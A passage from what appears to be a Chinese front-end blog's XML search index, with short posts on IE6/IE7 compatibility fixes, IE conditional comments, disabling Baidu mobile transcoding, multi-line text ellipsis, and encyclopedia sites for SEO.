    <url>%2F2015%2F07%2F13%2Fie6ie7%E4%B8%8B%E4%BD%BF%E7%94%A8appendchild%E5%90%91%E9%A1%B5%E9%9D%A2%E6%B7%BB%E5%8A%A0table%E5%85%83%E7%B4%A0%E6%97%B6%E5%A4%B1%E6%95%88%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%2F</url>
    <content type="text"><![CDATA[近日，项目中有一个用JS向页面中添加动态生成的表格元素的代码，代码如下：12345678var eleA = document.createElement("A");var eleTd = document.createElement("TD");var eleTr = document.createElement("TR");var eleTable = document.createElement("TABLE");eleTd.appendChild(eleA);eleTr.appendChild(eleTd);eleTable.appendChild(eleTr);document.body.appendChild(eleTable);在IE8、以及火狐下测试都没有问题，页面中会显示出添加表格后的样式，但是在IE6及IE7下却无法通过，查了很多资料，有的说是在IE6、7下不支持appendChild这个方法，后来经过验证，证实在IE6、7下是支持这个方法的，那这就奇怪了，为什么还是添加不了呢？ 后来终于依稀想起曾在某处见过一篇文章，说是TBODY的XX，具体的就实在是想不起来了。只好死马当活马医了，遂想到在动态创建TABLE的时候也向里面加一个TBODY，代码如下：1234567891011var eleA = document.createElement("A");eleA.innerHTML = "eleA";var eleTbody = document.createElement("TBODY");var eleTd = document.createElement("TD");var eleTr = document.createElement("TR");var eleTable = document.createElement("TABLE");eleTd.appendChild(eleA);eleTr.appendChild(eleTd);eleTbody.appendChild(eleTr);eleTable.appendChild(eleTbody);document.body.appendChild(eleTable);试之，果然显示正常。。OK。]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>appendChild</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jquery的append函数在IE7下无效解决办法]]></title>
    <url>%2F2015%2F07%2F13%2Fjquery%E7%9A%84append%E5%87%BD%E6%95%B0%E5%9C%A8ie7%E4%B8%8B%E6%97%A0%E6%95%88%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%2F</url>
    <content type="text"><![CDATA[使用jquery的函数append在页面上加带标签的内容，在FF下是没问题的，在IE7下总是加不上去经过测试发现我的内容里面多一个去掉之后就没问题了。看来IE7下append对标签的正确性非常敏感啊。在网上查资料，append的另一个问题是:当用到自定义标签时在IE7下也有这个问题。]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>ie7 append</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IE7,IE8怪癖模式下reflow与expression导致的问题]]></title>
    <url>%2F2015%2F07%2F13%2Fie7ie8%E6%80%AA%E7%99%96%E6%A8%A1%E5%BC%8F%E4%B8%8Breflow%E4%B8%8Eexpression%E5%AF%BC%E8%87%B4%E7%9A%84%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[在一个项目中为遮蔽FLASH,在IE里的一些特定条件下进行了reflow. 另外,为支持IE6和IE7,IE8怪癖模式下的fixed,使用了CSS表达expression 导致了悲剧的出现… 看效果:12345678910111213141516171819202122232425&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8" /&gt;&lt;title&gt;test&lt;/title&gt;&lt;style&gt;html&#123; background:url(about:blank) fixed;&#125;#d1&#123;zoom:expression(fix());&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div style ="width:60px;height:500px;border:solid 1px #000;background:#e2e2e2;position:absolute;" id="d1"&gt;&lt;/div&gt;&lt;script&gt;var el = document.getElementById('d1')function fix() &#123;el.style.top = document.body.scrollTop + 10 + 'px';&#125;;onscroll = function () &#123;document.body.style.zoom = 1;document.body.style.zoom = null;&#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;上面的例子, 在滚动条滚动的时候本身expression在执行,而reflow又触发了expression的执行,滚动条狂闪,忽大忽小.（IE7,IE8怪癖模式） 再看个更悲剧的…123456789101112131415161718192021222324252627&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8" /&gt;&lt;title&gt;test&lt;/title&gt;&lt;style&gt;html&#123; background:url(about:blank) fixed;&#125;#d1&#123;zoom:expression(fix());&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div style ="width:60px;height:500px;border:solid 1px #000;background:#e2e2e2;position:absolute;" id="d1"&gt;&lt;/div&gt;&lt;script&gt;var el = document.getElementById('d1')function fix() &#123;document.title = (document.title | 0) + 1;//el.style.top = (document.documentElement || document.body);rf();&#125;;var rf= function () &#123;document.body.style.zoom = 1;document.body.style.zoom = null;&#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;如果在expression执行的代码中有触发reflow的行为…而reflow又触发了expression…悲催的死循环出现了.如果两个问题混在一起搞……严重的甚至导致浏览器挂起。为此,我和我的兄弟Franky牺牲了将近2个小时.]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>expression</tag>
        <tag>reflow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[下拉菜单select高度（兼容IE6/IE7/IE8/火狐等主流浏览器）]]></title>
    <url>%2F2015%2F07%2F13%2F%E4%B8%8B%E6%8B%89%E8%8F%9C%E5%8D%95select%E9%AB%98%E5%BA%A6%EF%BC%88%E5%85%BC%E5%AE%B9ie6ie7ie8%E7%81%AB%E7%8B%90%E7%AD%89%E4%B8%BB%E6%B5%81%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%89%2F</url>
    <content type="text"><![CDATA[主要思路：&emsp;&emsp;用CSS设置select基本是没有效果的，因为select没有height这个属性，所以需要通过font-size来设置，使其高度撑起来。123456789101112131415161718192021222324252627&lt;!DOCTYPEhtml PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;&lt;htmlxmlns="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt;&lt;metahttp-equiv="Content-Type" content="text/html; charset=utf-8"/&gt;&lt;title&gt;兼容IE6/IE7/IE8/火狐---下拉菜单select高度&lt;/title&gt;&lt;styletype="text/css"&gt;.select&#123;border:1px solid#ccc;line-height:22px;color:#666;margin:-1px;padding:4px3px;font-size:13px;width:93px;*width:85px;&#125;.select_border&#123;*background:#fff;*border:1px solid#ccc;*padding:4px;width:83px;&#125;.container&#123;*border:0;*position:relative;*width:83px;*height:18px;*overflow:hidden;*background:#fff;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;divclass="select_border"&gt; &lt;divclass="container"&gt;&lt;select name=""class="select"&gt;&lt;optionselected="selected"&gt;区域不限&lt;/option&gt;&lt;option&gt;北京&lt;/option&gt;&lt;option&gt;天津&lt;/option&gt;&lt;option&gt;上海&lt;/option&gt;&lt;option&gt;重庆&lt;/option&gt;&lt;/select&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>select高度</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何禁止手机访问百度转码]]></title>
    <url>%2F2015%2F07%2F13%2F%E5%A6%82%E4%BD%95%E7%A6%81%E6%AD%A2%E6%89%8B%E6%9C%BA%E8%AE%BF%E9%97%AE%E7%99%BE%E5%BA%A6%E8%BD%AC%E7%A0%81%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;很多站长遇到这样的问题，用手机浏览器（如手机自带浏览器、uc、360等）打开自己的网站可以打开，但如果是通过搜索引擎搜索关键词要进入其网站，就显示一直在加载中。这就是百度转码问题，首先我们不要为了解决问题而去解决问题，如果你不想了解问题整个的来龙去脉，你可以直接跳到帖子尾部看解决方案。一、百度开放设配服务介绍&emsp;&emsp;为了提升用户的移动搜索结果浏览体验，百度移动搜索对具有对应手机站的PC站提供“开放适配”服务。如果您同时拥有PC站和手机站，且二者能够在内容上对应，您可向百度“提交”PC页—手机页的对应关系，若对应关系准确，将有助于百度在移动搜索中将原PC页结果替换为对应的手机页结果。积极的参与“开放适配”，将有助于您的手机站在百度移动搜索获得更好的展现，同时以更佳的浏览效果赢取用户口碑。百度开放适配服务共提供三种方案——自主适配、标注Meta声明、提交对应关系Sitemap，同时向站点提供开放适配进度查询。一 自主适配&emsp;&emsp;站点自己做好PC与手机之间的适配，以及手机站各个版式之间的适配。当手机用户通过百度移动搜索或者其他方式访问站点的PC页时，站点将其自动适配到该PC页面对应的手机页，并为之选择合适的页面版本。&emsp;&emsp;站点若暂不具备自主适配的能力，可以使用百度提供的终端适配服务，简单快捷地实现自主适配。即：站点调用百度终端适配服务API进行简单的开发，就可以获取到访客的终端信息（包含操作系统、浏览器、机型信息）及适配版式建议，根据这些信息在站点服务器上实施跳转进而完成自主适配。详情可点击查看终端适配服务介绍举例：频道页：当用户使用手机访问http://sports.sina.com.cn/nba时，站点自行适配到http://nba.sina.cn内容页：当用户使用手机访问http://bbs.gfan.com/android-4038549-1-1.html时，站点自行适配到http://bbs.gfan.com/mobile/android-4038549-1-1.html生效情况：&emsp;&emsp;不仅限于百度移动搜索，当用户通过手动输入网址，或者通过其他移动搜索引擎、导航站等渠道访问站点时，适配同样有效。二 标注Meta声明&emsp;&emsp;站点如果自行适配有困难，可以在PC页面中做简单改造，百度协助实现适配效果。即：站长在站点PC页的源代码头部嵌入一行或多行Meta信息，由Meta信息来指明该PC页对应的手机页的URL，以及该URL对应页面的格式，百度将根据用户终端类型选择最适合展示的页面。（无对应关系的PC页面无需添加Meta ）1. Meta声明格式：&lt;meta name=&quot;mobile-agent&quot;content=&quot;format=[wml|xhtml|html5]; url=url&quot;&gt;Meta声明示例：12&lt;meta name="mobile-agent" content="format=html5;url=http://3g.sina.com.cn/"&gt;&lt;meta name="mobile-agent" content="format=xhtml;url=http://sina.cn/"&gt;2. 站长需要将Meta声明放在PC页源代码内部，如下：1234&lt;head&gt;&lt;meta name="mobile-agent" content="format=html5;url=http://3g.sina.com.cn/"&gt;……&lt;/head&gt;生效情况：&emsp;&emsp;标注Meta声明这一适配方案仅在百度移动搜索中生效，即只有当用户通过百度移动搜索访问站点时，适配才会生效；通过其他渠道则不生效。在标注准确对应关系无误的情况下，大约需要七天左右的时间生效，老旧页面会有延迟。但百度不保证一定能在移动搜索结果中按照您标注的对应关系进行替换。三 提交对应关系Sitemap&emsp;&emsp;当站点推动PC页标注有困难时，可以选择提交PC页-手机页对应关系Sitemap，帮助百度在移动搜索结果进行替换。页面对应关系可以是url级别或者pattern级别的；站点也可以根据自身情况，将具备一定规律的url聚合成pattern，无法聚合的则仍以url对应形式存在，在站长平台分开提交。url级别sitemap:通过XML文件描述url级别的PC页与手机页的对应关系。（制作方式请点击查看）pattern级别sitemap：一个pattern级别的对应关系，往往可以表示成千上万的url对应关系。通过pattern的形式批量的提交对应关系，能够大大减少站长提交的数据量。（制作方式请点击查看）提交方式：使用站长平台-对应关系提交工具进行提交（工具使用方法请点击查看）生效情况：&emsp;&emsp;与meta方案相同，仅限于百度移动搜索中生效。在提交的对应关系无误的情况下，大约需要七天左右的时间生效，老旧页面会有延迟。百度不保证一定能在移动搜索结果中按照您提交的对应关系进行替换。四 开放适配进度查询&emsp;&emsp;提供包括手机站点击量、适配点击量在内的开放适配进度数据，便于站点及时了解开放适配的进度情况，把控自身流量数据。同时提供站点尚未进行适配的页面/频道排行榜，建议站点优先进行适配，并持续不断建设更多新的对应关系。查询方式：注册并登录百度站长平台提交PC网站并验证归属，具体验证网站归属方法可见帮助文档&emsp;&emsp;点击网站名称下具体需要进行适配的PC站，进入“站点工具”——“开放适配工具”——“开放适配进度查询”二、网站转码的相关协议说明A. no-transform协议TC支持的no-transform协议为如下两种形式：a. HTTP Response中显式声明Cache-control为no-transform。b. meta标签中显式声明Cache-control为no-tranform，格式为：123&lt;head&gt;&lt;meta http-equiv="Cache-Control" content="no-transform " /&gt;&lt;/head&gt;&emsp;&emsp;如第三方站点不希望页面被转码，可添加此协议，当用户进入第三方网站时，先进入中间提示页，页面将引导用户自主选择跳转至原网页。B. handheld协议页面通过lt;link&gt;标签显式指定WAP网页，声明格式如下：1&lt;link rel="alternate" type="application/vnd.wap.xhtml+xml" media="handheld" href="target"/&gt;&emsp;&emsp;如第三方站点不希望页面被转码，可添加此协议，告知我们原网页对应有一个WAP版页面，当用户进入第三方网站时，先进入中间提示页，让用户自主选择跳转至原网页或第三方网站自有的wap页面。C. User-Agent相关&emsp;&emsp;TC抓取页面时，使用的User-Agent为：Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; baidu Transcoder;)&emsp;&emsp;如第三方站点不希望转码HTML页面，且又可以提供对应的自有WAP页面，则可以根据这个User-Agent，返回自有WAP页，同时在HTTP Response显示声明：Content-Type为：vnd.wap.xhtml+xml，那么TC将不对这个页面转码，而是直接跳转至相应的自有WAP页面。&emsp;&emsp;安装了手机版模板，整站不要转码得选择哪个？操作是不是建立个html网页放在根目录下例如（2）加入代码1&lt;link rel="alternate" type="application/vnd.wap.xhtml+xml" media="handheld" href="bbs"/&gt;三、最终解决方案综上分析只需在网站head标签里面加入以下代码即可解决问题123&lt;meta http-equiv="Cache-Control" content="no-transform " /&gt;&lt;meta name="mobile-agent"content="format=xhtml; url=你的网址"&gt;&lt;link rel="alternate" type="application/vnd.wap.xhtml+xml" media="handheld" href="你的网址"/&gt;示例:12345&lt;head&gt;&lt;meta http-equiv="Cache-Control" content="no-transform " /&gt;&lt;meta name="mobile-agent"content="format=xhtml; url=http://www.js7e.com/"&gt;&lt;link rel="alternate" type="application/vnd.wap.xhtml+xml" media="handheld" href="http://www.js7e.com"/&gt;&lt;/head&gt;]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>百度转码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS判断浏览器]]></title>
    <url>%2F2015%2F07%2F13%2Fcss%E5%88%A4%E6%96%AD%E6%B5%8F%E8%A7%88%E5%99%A8%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;在进行WEB标准网页的学习和应用过程中，网页对浏览器的兼容性是经常接触到的一个问题。其中因微软公司的Internet Explorer(简称IE)占据浏览器市场的大半江山，此外还有Firefox、Opera等。需要对这些浏览器进行兼容。&emsp;&emsp;同时，单就IE而言，因IE版本的升级更替，目前浏览者使用的主要停留在 IE5(IE5.5)、IE6和IE7这三个版本中。而这3个版本对于我们制作的WEB标准网页（XHTML+CSS）解释执行的显示状况不尽相同。并且，其他非IE浏览器与IE对某些CSS解释也不一样。所以，通过IE浏览器中的专有条件注释可有针对性的进行相关属性的定义。条件注释只能用于Explorer 5+ Windows(以下简称IE)(条件注释从IE5开始被支持)。如果你安装了多个IE，条件注释（Conditional comments）将会以最高版本的IE为标准（目前为IE 7）。123456&lt;!--[if lte IE 6]&gt;&lt;LINK rel="stylesheet" type="text/css" href="images/StyleSheet.css" /&gt;&lt;![endif]--&gt;&lt;!--[if IE 7]&gt;&lt;LINK rel="stylesheet" type="text/css" href="images/css.css" /&gt;&lt;![endif]--&gt;123#example&#123;color:red ;&#125;/*firefox*/* html #example&#123;color:blue;&#125;/*ie6*/*+html #example&#123;color:green;&#125;/*ie7*/1&lt;!–[if lte IE 6]&gt;……&lt;![endif]–&gt;&emsp;&emsp;Ite：less than or equal to意思是小于或等于IE6浏览器，用于IE浏览器的条件注释，常用于CSShack，针对IE的JS等。条件注释只能在windows Internet Explorer(以下简称IE)下使用，因此我们可以通过条件注释来为IE添加特别的指令。通俗点，条件注释就是一些if判断，但这些判断不是在脚本里执行的，而是直接在html代码里执行的，比如：123&lt;!–[if IE]&gt;这里是正常的html代码&lt;![endif]–&gt;1，条件注释的基本结构和HTML的注释(–>```是一样的。因此IE以外的浏览器将会把它们看作是普通的注释而完全忽略它们。123456789101112131415161718192021* 2，IE将会根据if条件来判断是否如解析普通的页面内容一样解析条件注释里的内容。* 3，条件注释使用的是HTML的注释结构，因此他们只能使用在HTML文件里，而不能在CSS文件中使用。可使用如下代码检测当前IE浏览器的版本（注意：在非IE浏览器中是看不到效果的）```html&lt;!–[if IE]&gt;&lt;h1&gt;您正在使用IE浏览器&lt;/h1&gt;&lt;!–[if IE 5]&gt;&lt;h2&gt;版本 5&lt;/h2&gt;&lt;![endif]–&gt;&lt;!–[if IE 5.0]&gt;&lt;h2&gt;版本 5.0&lt;/h2&gt;&lt;![endif]–&gt;&lt;!–[if IE 5.5]&gt;&lt;h2&gt;版本 5.5&lt;/h2&gt;&lt;![endif]–&gt;&lt;!–[if IE 6]&gt;&lt;h2&gt;版本 6&lt;/h2&gt;&lt;![endif]–&gt;&lt;!–[if IE 7]&gt;&lt;h2&gt;版本 7&lt;/h2&gt;&lt;![endif]–&gt;&lt;![endif]–&gt;那如果当前的浏览器是IE，但版本比IE5还低，该怎么办呢，可以使用1&lt;!–[if ls IE 5]&gt;当然，根据条件注释只能在IE5+的环境之下，所以1&lt;!–[if ls IE 5]&gt;根本不会被执行。lte：就是Less than or equal to的简写，也就是小于或等于的意思。lt ：就是Less than的简写，也就是小于的意思。gte：就是Greater than or equal to的简写，也就是大于或等于的意思。gt ：就是Greater than的简写，也就是大于的意思。! ：就是不等于的意思，跟javascript里的不等于判断符相同Conditional comments属于CSS hack? 条件判断属于CSS hack吗？&emsp;&emsp;严格地说是属于CSS hack。因为就好象其他真正的css hack一样，它使得我们可以给一些浏览器赋予特殊的样式，再则它不依赖于某个浏览器的BUG来控制另外一个浏览器（的样式）。除此之外，条件判断还能用来做一些超出CSS HACK范围的事情(虽然这种情况很少发生)。因为条件判断不依赖于某个浏览器的hack,而是一个经过深思熟虑的特色功能，所以我相信它是可以被放心地使用的。当然，其他浏览器也有可能支持条件判断（到目前为止还没有），但是看起来，他们应该不会使用如IE]>```这样的语法。123456789101112应该如何应用条件注释本文一开始就说明了，因为IE各版本的浏览器对我们制作的WEB标准的页面解释不一样，具体就是对CSS的解释不同，我们为了兼容这些，可运用条件注释来各自定义，最终达到兼容的目的。比如：```html&lt;!– 默认先调用css.css样式表 –&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css.css&quot; /&gt;&lt;!–[if IE 7]&gt;&lt;!– 如果IE浏览器版是7,调用ie7.css样式表 –&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;ie7.css&quot; /&gt;&lt;![endif]–&gt;&lt;!–[if lte IE 6]&gt;&lt;!– 如果IE浏览器版本小于等于6,调用ie.css样式表 –&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;ie.css&quot; /&gt;&lt;![endif]–&gt;这其中就区分了IE7和IE6向下的浏览器对CSS的执行，达到兼容的目的。同时，首行默认的css.css还能与其他非IE浏览器实现兼容。注意：默认的CSS样式应该位于HTML文档的首行，进行条件注释判断的所有内容必须位于该默认样式之后。&emsp;&emsp;比如如下代码，在IE浏览器下执行显示为红色，而在非IE浏览器下显示为黑色。如果把条件注释判断放在首行，则不能实现。该例题很能说明网页对IE浏览器和非IE浏览器间的兼容性问题解决。123456789101112&lt;style type="text/css"&gt;body&#123;background-color: #000;&#125;&lt;/style&gt;&lt;!–[if IE]&gt;&lt;style type="text/css"&gt;body&#123;background-color: #F00;&#125;&lt;/style&gt;&lt;![endif]–&gt;&emsp;&emsp;同时，有人会试图使用1&lt;!–[if !IE]&gt;来定义非IE浏览器下的状况，但注意：条件注释只有在IE浏览器下才能执行，这个代码在非IE浏览下非单不是执行该条件下的定义，而是当做注释视而不见。正常就是默认的样式，对IE浏览器需要特殊处理的，才进行条件注释。在HTML文件里，而不能在CSS文件中使用。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>css判断浏览器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IE条件注释可以怎么玩]]></title>
    <url>%2F2015%2F07%2F13%2Fie%E6%9D%A1%E4%BB%B6%E6%B3%A8%E9%87%8A%E5%8F%AF%E4%BB%A5%E6%80%8E%E4%B9%88%E7%8E%A9%2F</url>
    <content type="text"><![CDATA[IE条件注释（Conditional comments）是IE浏览器私有的代码，是一个类似IF判断的语法注释块，IE5之上支持。代码看起来是这样的123&lt;!--[if IE 6]&gt;你正在使用IE6&lt;![endif]--&gt;他的语法是一个普通的HTML注释 &lt;!– comments –&gt;，分支块以 [if 条件(conditional)]&gt; 开始 &lt;![endif]结束。条件和JS中的if很类似，布尔值类型，可以把浏览器特性作为条件，比如IE ，IE 6， IE 7 ，此外还支持 非(!) 、与(&amp;) 、或(|)、 括号、 大于(gt)、 大于等于(gte)、 小于(le) 、 小于等于(lte)。直观的代码如下：123456789101112131415161718192021222324252627282930&lt;!--[if IE]&gt;According to the conditional comment this is IE&lt;br /&gt;&lt;![endif]--&gt;&lt;!--[if IE 6]&gt;According to the conditional comment this is IE 6&lt;br /&gt;&lt;![endif]--&gt;&lt;!--[if IE 7]&gt;According to the conditional comment this is IE 7&lt;br /&gt;&lt;![endif]--&gt;&lt;!--[if IE 8]&gt;According to the conditional comment this is IE 8&lt;br /&gt;&lt;![endif]--&gt;&lt;!--[if IE 9]&gt;According to the conditional comment this is IE 9&lt;br /&gt;&lt;![endif]--&gt;&lt;!--[if gte IE 8]&gt;According to the conditional comment this is IE 8 or higher&lt;br /&gt;&lt;![endif]--&gt;&lt;!--[if lt IE 9]&gt;According to the conditional comment this is IE lower than 9&lt;br /&gt;&lt;![endif]--&gt;&lt;!--[if lte IE 7]&gt;According to the conditional comment this is IE lower or equal to 7&lt;br /&gt;&lt;![endif]--&gt;&lt;!--[if gt IE 6]&gt;According to the conditional comment this is IE greater than 6&lt;br /&gt;&lt;![endif]--&gt;&lt;!--[if !IE]&gt; --&gt;According to the conditional comment this is not IE&lt;br /&gt;&lt;!-- &lt;![endif]--&gt;更详细的信息可以在微软MSDN文档中查看http://msdn.microsoft.com/en-us/library/ms537512.aspx基础介绍完毕，这个东西可以做IE浏览器检测，所以变成了CSS兼容多版本浏览器的方案之一。最普遍使用场景1123456789&lt;!--[if IE 8]&gt;&lt;link href="ie8.css" rel="stylesheet" type="text/css" media="screen" /&gt;&lt;![endif]--&gt;&lt;!--[if IE 7]&gt;&lt;link href="ie7.css" rel="stylesheet" type="text/css" media="screen" /&gt;&lt;![endif]--&gt;&lt;!--[if lt IE 7]&gt;&lt;link href="ie7lt.css" rel="stylesheet" type="text/css" media="screen" /&gt;&lt;![endif]--&gt;既可以解决浏览器差异，还可以保证CSS的标准化，避免了很多私有CSS属性作为hack的方式。可是这样会增加过多的文件加载，维护代码数量也增加，有没有更好的方式?使用场景21234&lt;!--[if lt IE 7]&gt;&lt;html class="ie6 oldie" lang="zh"&gt;&lt;![endif]--&gt;&lt;!--[if IE 7]&gt;&lt;html class="ie7 oldie" lang="zh"&gt;&lt;![endif]--&gt;&lt;!--[if IE 8]&gt;&lt;html class="ie8 oldie" lang="zh"&gt;&lt;![endif]--&gt;&lt;!--[if gt IE 8]&gt;&lt;!--&gt; &lt;html lang="zh"&gt; &lt;!--&lt;![endif]--&gt;场景1中的问题就解决了。通过选择器的优先级就可以轻松解决差异。有了条件注释，JS也能从总获益，免去的通过JS去判断浏览器类型和版本了。比如：如果你的页面想使用html5标签，条件注释也能发挥作用。123456789101112&lt;!--[if lte IE 8]&gt;&lt;script&gt;(function()&#123;var e = "abbr,article,aside,audio,canvas,datalist,details,dialog,eventsource,figure,footer,header,hgroup,mark,menu,meter,nav,output,progress,section,time,video".split(','),i= e.length;while(i--)&#123;document.createElement(e);&#125;&#125;)();&lt;/script&gt;&lt;![endif]--&gt;再比如：IE6的背景图片缓存问题12345&lt;!--[if IE 6]&gt;&lt;script&gt;document.execCommand("BackgroundImageCache", false, true);&lt;/script&gt;&lt;![endif]--&gt;甚至还可以帮助JS直接获取浏览器信息，大多数库和方案识别浏览器都是通过userAgent串处理的，而且大部分的应用场景也是if （IExx） {doxx}123456function isIE(v)&#123;var v = v || "",tester = document.createElement('div');tester.innerHTML = '&lt;!--[if IE ' + v + ']&gt;&lt;i&gt;&lt;/i&gt;&lt;![endif]--&gt;';return !!tester.getElementsByTagName('i')[0];&#125;还可以在HTML代码中玩1234&lt;body&gt;&lt;!--[if lte IE 8]&gt;&lt;p&gt;亲爱的用户，您的浏览器版本过低，建议您升级浏览器获得更好的体验....&lt;/p&gt;&lt;![endif]--&gt;或许还有更多的玩法，就等待您的发现和分享了。最后，条件注释也不仅限于HTML中，JS也可以有，那就是JScript的特性了，这种坑爹的东东还是少用的好，因为JS中的注释总是要被压缩掉的。12345&lt;script&gt;/*@cc_ondocument.write("You are using IE4 or higher");@*/&lt;/script&gt;]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>IE注释</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[多行文本溢出显示省略号(...)的方法]]></title>
    <url>%2F2015%2F07%2F13%2F%E5%A4%9A%E8%A1%8C%E6%96%87%E6%9C%AC%E6%BA%A2%E5%87%BA%E6%98%BE%E7%A4%BA%E7%9C%81%E7%95%A5%E5%8F%B7-%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;现在的浏览器都支持text-overflow:ellipsis属性，用来实现单行文本的溢出显示省略号，但是这个属性并不支持多行文本。那么有没有方法在多行文本上实现同样的效果呢？-webkit-line-clamp&emsp;&emsp;Webkit支持一个名为-webkit-line-clamp的属性，他其实是一个WebKit-Specific Unsupported Property，也就是说这个属性并不是标准的一部分，可能是Webkit内部使用的，或者被弃用的属性。但是既然被人发现了，而且能用，为什么不试试呢~o(∩_∩)o1234567p &#123;overflow : hidden;text-overflow: ellipsis;display: -webkit-box;-webkit-line-clamp: 2;-webkit-box-orient: vertical;&#125;-o-ellipsis-lastline&emsp;&emsp;从 Opera10.60开始，text-overflow属性有了一个名为-o-ellipsis-lastline的值。应用后的效果就像名字一样，在文本的最后一行加上省略号。这个方法比楼上的方法简单多了，可惜也不在标准之内//(ㄒoㄒ)//123456p &#123;overflow: hidden;white-space: normal;height: 3em;text-overflow: -o-ellipsis-lastline;&#125;jQuery&emsp;&emsp;除了各个浏览器私有的属性，有没有跨浏览器的解决方法呢？当然是通过js实现啦！（通过从后向前逐个删除末尾字符，直至元素的高度小于父元素高度）1234567$(".figcaption").each(function(i)&#123; var divH = $(this).height(); var $p = $("p", $(this)).eq(0); while ($p.outerHeight() &gt; divH) &#123; $p.text($p.text().replace(/(\s)*([a-zA-Z0-9]+|\W)(\.\.\.)?$/, "...")); &#125;;&#125;);]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>文字溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[display兼容小结]]></title>
    <url>%2F2015%2F07%2F13%2Fdisplay%E5%85%BC%E5%AE%B9%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[display:block 此元素将显示为块级元素，此元素前后会带有换行符。display:table 此元素会作为块级表格来显示（类似 &lt;table&gt;），表格前后带有换行符使用发现以上两个的区别是，如果元素同时定义边框可以看出，block时元素宽度是100% 而table时宽度仅为内容所占宽度。【除了ie7ie6定义为table也都是占100%宽度外】display:inline-block 行内块元素，可以使元素并排显示。注意是对块级元素使用后所有浏览器下，两元素之间会多产生6px的间隔。而有IE6 IE7下些方法无法使元素并排，解决办法是： display:inline-block;zoom:1;display:inline;[这样不会产生6PX间隔， *仅ie6ie7可识别 注意书写顺序]而对内联元素使用了inline-block，那所有的浏览器显示都是正常的。【可以使得内联元素定义的宽度有效并且仍然并排显示 / 如果用display:block使内联元素定义的宽度有效果则会产生换行。】（ie6、ie7中对内联元素使用display:inline-block，IE是不识别的，但使用display:inline-block在IE下会触发layout，从而使内联元素拥有了display:inline-block属性的表征。）]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>display兼容</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[做SEO除了百度百科你还需要了解这些！]]></title>
    <url>%2F2015%2F07%2F12%2F%E5%81%9Aseo%E9%99%A4%E4%BA%86%E7%99%BE%E5%BA%A6%E7%99%BE%E7%A7%91%E4%BD%A0%E8%BF%98%E9%9C%80%E8%A6%81%E4%BA%86%E8%A7%A3%E8%BF%99%E4%BA%9B%EF%BC%81%2F</url>
    <content type="text"><![CDATA[无论是SEO，还是推广，百度百科都是兵家必争之地。好的百度百科可以带给网站很大的权重。当然对于百度搜索引擎就更加不要说了，百利而无一害呀。可是并不是你想要的百度百科词条都可以让你去编辑了。那为什么不试试他们呢？维基百科作为始祖的维基百科有着各类语言的百科内容。当然作为中国人对于推广中文维基百科也就香丹的重要了。但是现在维基百科创建已经不是那么容易的啦。个人感觉比百度百科难一点，如果你可以搞定，那你得试试~互动百科自称为全球最大的中文百科网站，似乎无视百度百科的存在，不过他有这个一个噱头就是他只是百科，而百度就不是。互动百科以其强大的生命力生活着。现今又融资1亿，有着势如破竹的态势。估计上市不远了。所以互动百科无疑也是一个不错的选择。审核也是相对很速度的。搜搜百科作为互联网巨头腾讯下的附属产品。有这庞大的用户群体。 真所谓皇帝的女儿不愁嫁。搜搜百科在未来的发展前景肯定不会输给百度。你要问问现在的小孩他知不知道百度不一定，你要问他知道不知道QQ，你肯定知道。这个你懂的。站长百科站长百科，将百科运用在站长身上完全恰当不过了。无论你要推介什么网站。首先你得是个站长。所以站长百科无疑就给站长朋友指定了一条明路。当然站长百科你也是可以去利用的。这个方向大致就是站长类的网站比较适用。当然专注于一类行业的百科更是很多，这部分资源可是相当有分量的。所以不妨站长朋友可以好好利用起来，不要在百度一棵树上吊死。当然百科类的审核标准大致也就是那样。]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>seo百科</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何让网站顺利通过W3C验证]]></title>
